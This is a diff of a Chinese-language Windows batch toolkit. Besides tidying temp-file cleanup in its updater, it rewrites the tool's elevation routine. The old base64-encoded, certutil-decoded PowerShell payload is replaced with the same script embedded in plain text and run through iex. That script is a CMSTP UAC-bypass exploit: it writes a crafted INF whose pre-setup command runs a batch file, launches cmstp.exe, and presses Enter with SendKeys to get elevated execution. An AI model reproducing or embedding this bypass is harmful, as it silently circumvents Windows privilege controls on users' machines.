@@ -49,7 +49,7 @@ setlocal
 set "dosqssj=!time!"
 chcp 936>nul
 set ver=20250101
-set versize=170819
+set versize=168565
 set fy1=___
 set xz0=0
 set "pause=set /p =按任意键返回菜单<nul&pause>nul"
@@ -5098,6 +5098,7 @@ if exist "%systemroot%\system32\curl.exe" (
 )
 :updatecheck
 cls
+del /f /q "%temp%\dostoolupdate"
 set /a "checkver=gxver-verbak"
 if !checkver! gtr 0 (
 	set /p =检查到更新版本: <nul
@@ -5113,7 +5114,6 @@ if !checkver! gtr 0 (
 	set /p "shuru=按回车键更新，按e返回菜单:"
 	if not defined shuru (goto startupdate)
 	if /i "!shuru!" equ "e" (
-		del /f /q "%temp%\dostoolupdate"
 		endlocal
 		set verbak=
 		goto memuv2
@@ -5122,7 +5122,6 @@ if !checkver! gtr 0 (
 	call :out 2
 	goto updatecheck
 ) else (
-	del /f /q "%temp%\dostoolupdate"
 	echo;没有检查到更新版本
 	%hx%
 	%pause%
@@ -5157,8 +5156,9 @@ call :hash "%temp%\dostool" sha1 hash
 if /i "!hash!" equ "!doshash!" (
 	endlocal
 	endlocal
-	copy /z /y "%temp%\dostool" %0&goto chushihua
+	copy /z /y "%temp%\dostool" %0&del /f /q "%temp%\dostool"&goto chushihua
 ) else (
+	del /f /q "%temp%\dostool"
 	call :colortxt c 文件无效
 	echo;
 	call :out 2
@@ -5393,98 +5393,119 @@ set /p =!cswz!48;2;!brgb!;38;2;!qrgb!m!zt!!cswz!!ysbak!<nul
 goto :eof
 :su
 rem 使用goto调用:su
-(
-echo;IyBVQUMgQnlwYXNzIHBvYyB1c2luZyBTZW5kS2V5cw0KIyBWZXJzaW9uIDEuMA0K
-echo;IyBBdXRob3I6IE9kZHZhciBNb2UNCiMgRnVuY3Rpb25zIGJvcnJvd2VkIGZyb206
-echo;IGh0dHBzOi8vcG93ZXJzaGVsbC5vcmcvZm9ydW1zL3RvcGljL3NlbmRrZXlzLw0K
-echo;IyBUb2RvOiBIaWRlIHdpbmRvdyBvbiBzY3JlZW4gZm9yIHN0ZWFsdGgNCiMgVG9k
-echo;bzogTWFrZSBzY3JpcHQgZWRpdCB0aGUgSU5GIGZpbGUgZm9yIGNvbW1hbmQgdG8g
-echo;aW5qZWN0Li4uDQoNCg0KRnVuY3Rpb24gc2NyaXB0OlNldC1JTkZGaWxlIHsNCltD
-echo;bWRsZXRCaW5kaW5nKCldDQoJUGFyYW0gKA0KCVtQYXJhbWV0ZXIoSGVscE1lc3Nh
-echo;Z2U9IlNwZWNpZnkgdGhlIElORiBmaWxlIGxvY2F0aW9uIildDQoJJEluZkZpbGVM
-echo;b2NhdGlvbiA9ICIkZW52OnRlbXBcQ01TVFAuaW5mIiwNCgkNCglbUGFyYW1ldGVy
-echo;KEhlbHBNZXNzYWdlPSJTcGVjaWZ5IHRoZSBjb21tYW5kIHRvIGxhdW5jaCBpbiBh
-echo;IFVBQy1wcml2aWxlZ2VkIHdpbmRvdyIpXQ0KCVtTdHJpbmddJENvbW1hbmRUb0V4
-echo;ZWN1dGUgPSAn
-)>%temp%\1.base
-(
-echo;Jw0KCSkNCg0KJEluZkNvbnRlbnQgPSBAIg0KW3ZlcnNpb25dDQpTaWduYXR1cmU9
-echo;YCRjaGljYWdvYCQNCkFkdmFuY2VkSU5GPTIuNQ0KDQpbRGVmYXVsdEluc3RhbGxd
-echo;DQpDdXN0b21EZXN0aW5hdGlvbj1DdXN0SW5zdERlc3RTZWN0aW9uQWxsVXNlcnMN
-echo;ClJ1blByZVNldHVwQ29tbWFuZHM9UnVuUHJlU2V0dXBDb21tYW5kc1NlY3Rpb24N
-echo;Cg0KW1J1blByZVNldHVwQ29tbWFuZHNTZWN0aW9uXQ0KOyBDb21tYW5kcyBIZXJl
-echo;IHdpbGwgYmUgcnVuIEJlZm9yZSBTZXR1cCBCZWdpbnMgdG8gaW5zdGFsbA0KJENv
-echo;bW1hbmRUb0V4ZWN1dGUNCnRhc2traWxsIC9JTSBjbXN0cC5leGUgL0YNCg0KW0N1
-echo;c3RJbnN0RGVzdFNlY3Rpb25BbGxVc2Vyc10NCjQ5MDAwLDQ5MDAxPUFsbFVTZXJf
-echo;TERJRFNlY3Rpb24sIDcNCg0KW0FsbFVTZXJfTERJRFNlY3Rpb25dDQoiSEtMTSIs
-echo;ICJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxBcHAg
-echo;UGF0aHNcQ01NR1IzMi5FWEUiLCAiUHJvZmlsZUluc3RhbGxQYXRoIiwgIiVVbmV4
-echo;cGVjdGVkRXJyb3IlIiwgIiINCg0KW1N0cmluZ3NdDQpTZXJ2aWNlTmFtZT0iQ29y
-echo;cFZQTiINClNob3J0U3ZjTmFtZT0iQ29ycFZQTiINCg0KIkANCg0KJEluZkNvbnRl
-echo;bnQgfCBPdXQtRmlsZSAkSW5mRmlsZUxvY2F0aW9uIC1FbmNvZGluZyBBU0NJSQ0K
-echo;fQ0KDQoNCkZ1bmN0aW9uIEdldC1Id25kDQp7DQogIFtDbWRsZXRCaW5kaW5nKCld
-echo;DQogICAgDQogIFBhcmFtDQogICgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
-echo;ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUp
-echo;XSBbc3RyaW5nXSAkUHJvY2Vzc05hbWUNCiAgKQ0KICBQcm9jZXNzDQogICAgew0K
-echo;ICAgICAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1N0b3AnDQogICAgICAg
-echo;IFRyeSANCiAgICAgICAgew0KICAgICAgICAgICAgJGh3bmQgPSBHZXQtUHJvY2Vz
-echo;cyAtTmFtZSAkUHJvY2Vzc05hbWUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9w
-echo;ZXJ0eSBNYWluV2luZG93SGFuZGxlDQogICAgICAgIH0NCiAgICAgICAgQ2F0Y2gg
-echo;DQogICAgICAgIHsNCiAgICAgICAgICAgICRod25kID0gJG51bGwNCiAgICAgICAg
-echo;fQ0KICAgICAgICAkaGFzaCA9IEB7DQogICAgICAgIFByb2Nlc3NOYW1lID0gJFBy
-echo;b2Nlc3NOYW1lDQogICAgICAgIEh3bmQgICAgICAgID0gJGh3bmQNCiAgICAgICAg
-echo;fQ0KICAgICAgICANCiAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQc09iamVjdCAt
-echo;UHJvcGVydHkgJGhhc2gNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIFNldC1XaW5kb3dB
-echo;Y3RpdmUNCnsNCiAgW0NtZGxldEJpbmRpbmcoKV0NCg0KICBQYXJhbQ0KICAoDQog
-echo;ICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxp
-echo;bmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0gW3N0cmluZ10gJE5hbWUNCiAgKQ0K
-echo;ICANCiAgUHJvY2Vzcw0KICB7DQogICAgJG1lbWJlckRlZmluaXRpb24gPSBAJw0K
-echo;ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRl
-echo;cm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0K
-echo;ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVl
-echo;KV0gcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRGb3JlZ3JvdW5kV2luZG93
-echo;KEludFB0ciBoV25kKTsNCg0KJ0ANCg0KICAgIEFkZC1UeXBlIC1NZW1iZXJEZWZp
-echo;bml0aW9uICRtZW1iZXJEZWZpbml0aW9uIC1OYW1lIEFwaSAtTmFtZXNwYWNlIFVz
-echo;ZXIzMg0KICAgICRod25kID0gR2V0LUh3bmQgLVByb2Nlc3NOYW1lICROYW1lIHwg
-echo;U2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSHduZA0KICAgIElmICgkaHdu
-echo;ZCkgDQogICAgew0KICAgICAgJG9uVG9wID0gTmV3LU9iamVjdCAtVHlwZU5hbWUg
-echo;U3lzdGVtLkludFB0ciAtQXJndW1lbnRMaXN0ICgwKQ0KICAgICAgW1VzZXIzMi5B
-echo;cGldOjpTZXRGb3JlZ3JvdW5kV2luZG93KCRod25kKQ0KICAgICAgW1VzZXIzMi5B
-echo;cGldOjpTaG93V2luZG93KCRod25kLCA1KQ0KICAgIH0NCiAgICBFbHNlIA0KICAg
-echo;IHsNCiAgICAgIFtzdHJpbmddICRod25kID0gJ04vQScNCiAgICB9DQoNCiAgICAk
-echo;aGFzaCA9IEB7DQogICAgICBQcm9jZXNzID0gJE5hbWUNCiAgICAgIEh3bmQgICAg
-echo;PSAkaHduZA0KICAgIH0NCiAgICAgICAgDQogICAgTmV3LU9iamVjdCAtVHlwZU5h
-echo;bWUgUHNPYmplY3QgLVByb3BlcnR5ICRoYXNoDQogIH0NCn0NCg0KLiBTZXQtSU5G
-echo;RmlsZQ0KI05lZWRzIFdpbmRvd3MgZm9ybXMNCmFkZC10eXBlIC1Bc3NlbWJseU5h
-echo;bWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCklmIChUZXN0LVBhdGggJEluZkZpbGVM
-echo;b2NhdGlvbikgew0KI0NvbW1hbmQgdG8gcnVuDQokcHMgPSBuZXctb2JqZWN0IHN5
-echo;c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzc3RhcnRpbmZvICJjOlx3aW5kb3dzXHN5
-echo;c3RlbTMyXGNtc3RwLmV4ZSINCiRwcy5Bcmd1bWVudHMgPSAiL2F1ICRJbmZGaWxl
-echo;TG9jYXRpb24iDQokcHMuVXNlU2hlbGxFeGVjdXRlID0gJGZhbHNlDQoNCiNTdGFy
-echo;dCBpdA0KW3N5c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzXTo6U3RhcnQoJHBzKQ0K
-echo;DQpkbw0Kew0KCSMgRG8gbm90aGluZyB1bnRpbCBjbXN0cCBpcyBhbiBhY3RpdmUg
-echo;d2luZG93DQp9DQp1bnRpbCAoKFNldC1XaW5kb3dBY3RpdmUgY21zdHApLkh3bmQg
-echo;LW5lIDApDQoNCg0KI0FjdGl2YXRlIHdpbmRvdw0KU2V0LVdpbmRvd0FjdGl2ZSBj
-echo;bXN0cA0KDQojU2VuZCB0aGUgRW50ZXIga2V5DQpbU3lzdGVtLldpbmRvd3MuRm9y
-echo;bXMuU2VuZEtleXNdOjpTZW5kV2FpdCgie0VOVEVSfSIpDQp9
-)>%temp%\2.base
-rem su.txt的内容不支持中文路径
-set /p =%comspec% /c %0 -ks<nul>%temp%\su.bat
-set /p =%temp%\su.bat<nul>%temp%\su.txt
-certutil -decode -f "%temp%\1.base" %temp%\1.txt>nul
-certutil -decode -f "%temp%\2.base" %temp%\2.txt>nul
-copy /b "%temp%\1.txt"+"%temp%\su.txt"+"%temp%\2.txt" "%temp%\bypassps1">nul
-powershell -mta -nologo -noprofile -command "$command=[IO.File]::ReadAllText('"%temp%\bypassps1"'); iex ($command)"
+set /p =%comspec% /c %0 -ks<nul>"%temp%\su.bat"
+powershell -mta -nologo -noprofile -command "$command=[IO.File]::ReadAllText('%0') -split '#su\#.*'; iex ($command[1])"
 rem 延时删除文件确保能被上一条指令读取
 call :out 1
-del /f /q %temp%\su.txt;^
-		%temp%\1.base;^
-		%temp%\2.base;^
-		%temp%\1.txt;^
-		%temp%\2.txt;^
-		%temp%\bypassps1;^
-		%temp%\su.bat
+del /f /q "%temp%\su.bat";"%Temp%\CMSTP.inf"
 exit 0
+#su#
+# UAC Bypass poc using SendKeys
+# Version 1.0
+# Author: Oddvar Moe
+# Functions borrowed from: https://powershell.org/forums/topic/sendkeys/
+# Todo: Hide window on screen for stealth
+# Todo: Make script edit the INF file for command to inject...
+Function Set-INFFile {
+	[CmdletBinding()]
+	Param (
+		[Parameter(HelpMessage="Specify the INF file location")]
+		$InfFileLocation = "$env:temp\CMSTP.inf",
+		
+		[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
+		[String]$CommandToExecute = "$env:temp\su.bat"
+	)
+	$InfContent = @"
+[version]
+Signature=`$chicago`$
+AdvancedINF=2.5
+
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+; Commands Here will be run Before Setup Begins to install
+$CommandToExecute
+taskkill /IM cmstp.exe /F
+
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+
+[AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+
+[Strings]
+ServiceName="CorpVPN"
+ShortSvcName="CorpVPN"
+"@
+	$InfContent | Out-File $InfFileLocation -Encoding ASCII
+}
+Function Get-Hwnd {
+	[CmdletBinding()]
+	Param (
+		[Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
+		[string]$ProcessName
+	)
+	Process {
+		$ErrorActionPreference = 'Stop'
+		Try {
+			$hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
+		} Catch {
+			$hwnd = $null
+		}
+		$hash = @{
+			ProcessName = $ProcessName
+			Hwnd        = $hwnd
+		}
+		New-Object -TypeName PsObject -Property $hash
+	}
+}
+Function Set-WindowActive {
+	[CmdletBinding()]
+	Param (
+		[Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
+		[string]$Name
+	)
+	Process {
+		$memberDefinition = @'
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+[DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+'@
+		Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
+		$hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
+		If ($hwnd) {
+			[User32.Api]::SetForegroundWindow($hwnd)
+			[User32.Api]::ShowWindow($hwnd, 5)
+		} Else {
+			[string]$hwnd = 'N/A'
+		}
+		$hash = @{
+			Process = $Name
+			Hwnd    = $hwnd
+		}
+		New-Object -TypeName PsObject -Property $hash
+	}
+}
+. Set-INFFile
+# Needs Windows forms
+Add-Type -AssemblyName System.Windows.Forms
+If (Test-Path $InfFileLocation) {
+	# Command to run
+	$ps = New-Object System.Diagnostics.ProcessStartInfo "c:\windows\system32\cmstp.exe"
+	$ps.Arguments = "/au $InfFileLocation"
+	$ps.UseShellExecute = $false
+	# Start it
+	[System.Diagnostics.Process]::Start($ps)
+	do {
+		# Do nothing until cmstp is an active window
+	} until ((Set-WindowActive cmstp).Hwnd -ne 0)
+	# Activate window
+	Set-WindowActive cmstp
+	# Send the Enter key
+	[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+}
+#su#
 :xdwjs
 setlocal
 set Bytes=%~1
